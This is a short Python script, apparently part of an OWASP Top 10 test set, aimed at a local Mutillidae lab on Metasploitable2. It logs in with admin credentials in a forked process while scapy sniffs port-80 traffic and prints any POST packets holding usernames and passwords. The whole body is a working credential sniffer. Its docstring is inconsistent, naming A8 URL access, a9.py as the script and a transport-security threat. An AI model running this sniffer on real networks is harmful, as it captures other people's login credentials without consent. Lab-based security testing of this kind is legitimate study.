#!/usr/bin/env python
'''
This script is part of the scripts developed which test a Web Application against a number 
of vulnerabilities. It is a python implementation for the OWASP Top 10. 

This is focused on the A8: Failure to Restrict URL Access

Threat Agents: Consider anyone who can monitor the network traffic of your users.
If the application is on the internet, who knows how your users access it. Dont forget back
end connections.

Exploitability: Monitoring users network traffic can be difficult, but is sometimes easy.
The primary difficulty lies in monitoring the proper network traffic while users are accessing
the vulnerable site.

The attacks take place to a local Multillidae platform which is installed in the Metasploitable2
Example Usage: ./a9.py 

created by: Dr Ciphers
'''
import mechanize
import os
from scapy.all import *

def adminConnect(url):
    browser = mechanize.Browser()
    
    #override the robots checking
    browser.set_handle_robots(False)

    response = browser.open(url)
   
    browser.select_form(nr=0)
    browser.form['username'] = 'admin'
    browser.form['password'] = 'adminpass'
    browser.submit()


def credsniffer(pkt):
    if pkt.haslayer('Raw'): 
        #convert packet payload to string
        strPkt = str(pkt['Raw'])
        
        #start searching inside the payload
        if 'POST' in strPkt:
            if (('username' in strPkt) and ('password' in strPkt)):
                print pkt.show()


def main():

    url = 'http://192.168.1.10/mutillidae/index.php?page=login.php'
    forked_pid = os.fork()

    if forked_pid==0:
        print 'Process id of child: %s'%os.getpid()
        adminConnect(url)
    else:
        print 'Proccess id of main process: %s'%os.getpid()
        sniff(iface="eth1", store=0, count=200, filter="tcp port 80", prn=credsniffer)

if __name__ =="__main__":
    main()


